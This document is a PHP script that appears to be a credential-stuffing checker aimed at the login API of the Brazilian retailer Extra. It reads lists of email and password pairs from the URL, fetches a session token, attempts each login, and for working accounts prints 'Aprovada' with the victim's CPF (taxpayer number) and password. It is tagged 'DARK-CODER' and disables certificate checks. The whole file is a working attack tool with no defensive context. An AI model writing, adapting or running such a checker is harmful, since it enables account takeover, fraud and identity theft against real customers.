<?php
error_reporting(0);
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function pagina($link,$post,$heder) {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $link);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    if ($heder) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $heder);
    } 
    if ($post) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    $P1 = curl_exec($ch);
    curl_close($ch);
    return $P1;

}

function delimit($sepa,$valor) {
    $inici = str_replace($sepa, $sepa[0], $valor);
    $resul = explode($sepa[0], $inici);
    return  $resul;
}

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separadores = array(",","|",":","'"," ","~",";","»");
$delim = delimit($separadores,$lista);
$email = $delim[0];
$senha = $delim[1];

if ($email && $senha) {
    
  $pay = pagina('https://carrinho.extra.com.br/Checkout?ReturnUrl=https://www.extra.com.br','',array('Origin: https://carrinho.extra.com.br','Host: carrinho.extra.com.br'));

    $token = GetStr($pay, 'var token = "','";');

    $logar = pagina('https://carrinho.extra.com.br/Api/checkout/Cliente.svc/Cliente/Login','{"clienteLogin":{"Token":"'.$token.'","Operador":"","IdUnidadeNegocio":5,"PalavraCaptcha":"","Senha":"'.$senha.'","cadastro":"on","Email":"'.$email.'"}',array('Host: carrinho.extra.com.br','Origin: https://carrinho.extra.com.br','Content-Type: application/json; charset=UTF-8',));

    $cpf = GetStr($logar, '"Cpf":"','"');
	

    //echo $logar;

       if (strpos($logar, '"Erro":false')) {
        echo '<tr><th><font class="label label-success">Aprovada</font></th>&nbsp<th><font class="label label-danger">&nbsp'.$cpf.'|'.$senha.'</font></th></tr> <font class="label label-danger">DARK-CODER</font></th></tr><br>';
    } else {
        echo '<tr><th><font color=red class="label label-danger">Reprovada</font></th>&nbsp<th><font>'.$email.' » '.$senha.'</font></th></tr><br>';
    }

} else {
    echo "ERRO NO EMAIL OU SENHA: $lista"; exit();
}

?>